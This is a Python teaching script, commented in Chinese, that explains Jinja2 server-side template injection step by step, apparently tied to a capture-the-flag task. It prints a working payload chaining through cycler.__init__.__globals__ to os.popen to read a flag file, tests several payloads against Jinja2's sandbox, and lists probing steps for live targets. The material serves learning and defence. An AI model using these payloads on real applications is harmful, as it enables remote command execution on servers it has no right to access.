"""
Jinja2 SSTI (Server-Side Template Injection) 原理演示
展示 payload 的執行路徑
"""

from jinja2 import Environment, Template

# ===== 第一部分: 理解 Python 的 __globals__ =====
print("=" * 60)
print("1. 理解 Python 函數的 __globals__ 屬性")
print("=" * 60)

def my_function():
    return "Hello"

print(f"函數對象: {my_function}")
print(f"__globals__ 類型: {type(my_function.__globals__)}")
print(f"__globals__ 中的部分內容:")
for key in list(my_function.__globals__.keys())[:5]:
    print(f"  - {key}")

# ===== 第二部分: 找到 cycler 的正確位置 =====
print("\n" + "=" * 60)
print("2. 找到 Jinja2 的 cycler")
print("=" * 60)

# cycler 實際上是在 Jinja2 環境的 globals 中
env = Environment()
print(f"Jinja2 環境的 globals 中包含:")
for key in list(env.globals.keys()):
    print(f"  - {key}")

# 獲取 cycler
if 'cycler' in env.globals:
    cycler_func = env.globals['cycler']
    print(f"\ncycler 函數: {cycler_func}")
    print(f"cycler 類型: {type(cycler_func)}")
    
    # 創建一個 cycler 實例
    cycler_instance = cycler_func('odd', 'even')
    print(f"cycler 實例: {cycler_instance}")
    print(f"cycler 實例類型: {type(cycler_instance)}")
    
    # 檢查 __init__ 方法
    if hasattr(cycler_instance.__class__, '__init__'):
        init_method = cycler_instance.__class__.__init__
        print(f"\n__init__ 方法: {init_method}")
        
        # 檢查 __globals__
        if hasattr(init_method, '__globals__'):
            print(f"__init__.__globals__ 存在!")
            print(f"__globals__ 中的部分模塊:")
            globals_keys = list(init_method.__globals__.keys())[:15]
            for key in globals_keys:
                print(f"  - {key}")
        else:
            print("注意: __init__ 可能是內置方法,沒有 __globals__")

# ===== 第三部分: 模擬完整的 SSTI 路徑 =====
print("\n" + "=" * 60)
print("3. 模擬完整的 SSTI 攻擊路徑")
print("=" * 60)

# 創建一個模板並渲染
template_code = """
{{ self }}
"""

template = env.from_string(template_code)
result = template.render()
print(f"模板中的 self: {result}")

# 現在讓我們看看如何通過模板訪問 cycler
print("\n通過模板訪問 cycler:")
template2 = env.from_string("{{ cycler }}")
result2 = template2.render()
print(f"cycler 對象: {result2}")

# 演示如何找到 __globals__
print("\n" + "=" * 60)
print("4. 尋找可以訪問 __globals__ 的對象")
print("=" * 60)

# 在 Jinja2 中,我們需要找到有 __globals__ 的函數對象
# 通常通過以下路徑:
print("常見的 SSTI payload 路徑:")
print("1. 通過 __class__ 和 __mro__ 找到內置類")
print("2. 通過內置類找到有 __globals__ 的方法")
print("3. 從 __globals__ 訪問 os 等模塊")

# 演示一個簡化的路徑
template3 = env.from_string("""
{{ ''.__class__ }}
""")
result3 = template3.render()
print(f"\n字符串的類: {result3}")

template4 = env.from_string("""
{{ ''.__class__.__mro__ }}
""")
result4 = template4.render()
print(f"字符串類的 MRO: {result4}")

# ===== 第五部分: Python 名稱修飾 =====
print("\n" + "=" * 60)
print("5. Python 名稱修飾 (Name Mangling)")
print("=" * 60)

class Example:
    def __init__(self):
        self.__private = "私有屬性"
        self._protected = "受保護屬性"
        self.public = "公開屬性"

obj = Example()
print(f"公開屬性: obj.public = {obj.public}")
print(f"受保護屬性: obj._protected = {obj._protected}")
print(f"私有屬性 (直接訪問): ", end="")
try:
    print(obj.__private)
except AttributeError as e:
    print(f"失敗 - {e}")

print(f"私有屬性 (名稱修飾): obj._Example__private = {obj._Example__private}")

# ===== 第六部分: 實際的 payload 分析 =====
print("\n" + "=" * 60)
print("6. 實際 Payload 分析")
print("=" * 60)

payload = "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"
print(f"Payload:\n{payload}\n")
print("路徑分解:")
print("├─ self")
print("│  └─ 當前模板對象 (jinja2.runtime.TemplateReference)")
print("│")
print("├─ _TemplateReference__context")
print("│  └─ 私有屬性 __context 的修飾名")
print("│  └─ 包含模板的上下文環境")
print("│")
print("├─ cycler")
print("│  └─ 從上下文中獲取 cycler 函數/類")
print("│")
print("├─ __init__")
print("│  └─ cycler 的初始化方法")
print("│")
print("├─ __globals__")
print("│  └─ 函數的全局命名空間字典")
print("│")
print("├─ os")
print("│  └─ Python 的 os 模塊")
print("│")
print("└─ popen('cat flag.txt').read()")
print("   └─ 執行系統命令並讀取輸出")

# ===== 第七部分: 防禦措施 =====
print("\n" + "=" * 60)
print("7. 防禦 SSTI 的措施")
print("=" * 60)

from jinja2.sandbox import SandboxedEnvironment

sandbox_env = SandboxedEnvironment()

# 測試沙箱
dangerous_payloads = [
    "{{ ''.__class__ }}",
    "{{ config }}",
    "{{ self }}",
    "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
]

print("測試沙箱環境:")
for payload in dangerous_payloads:
    try:
        template = sandbox_env.from_string(payload)
        result = template.render()
        print(f"✗ 允許: {payload[:30]}... → {result[:50]}")
    except Exception as e:
        print(f"✓ 阻止: {payload[:30]}... → {type(e).__name__}")

print("\n" + "=" * 60)
print("8. 如何在實際環境中測試")
print("=" * 60)

print("""
測試步驟:
1. 確認是否使用 Jinja2
   → 輸入 {{ 7*7 }} 看是否返回 49

2. 確認是否可以訪問對象
   → {{ ''.__class__ }}
   → {{ self }}
   → {{ config }}

3. 嘗試找到危險的類或函數
   → {{ ''.__class__.__mro__ }}
   → {{ ''.__class__.__mro__[1].__subclasses__() }}

4. 尋找有 __globals__ 的方法
   → 遍歷 __subclasses__ 找到有用的類
   → 找到可以訪問 os、subprocess 等模塊的路徑

5. 構造 payload 執行命令
   → 使用找到的路徑訪問系統命令
""")

print("\n" + "=" * 60)
print("總結")
print("=" * 60)
print("""
關鍵點:
1. cycler 在 Jinja2 環境的 globals 中,不是獨立模塊
2. SSTI 利用 Python 的動態特性和內省機制
3. 查找路徑需要理解 Python 對象模型
4. _TemplateReference__context 是名稱修飾的結果
5. 防禦的關鍵是不讓用戶控制模板內容

學習資源:
- Jinja2 官方文檔: https://jinja.palletsprojects.com/
- Python 數據模型: https://docs.python.org/3/reference/datamodel.html
- SSTI 研究: PayloadsAllTheThings GitHub
""")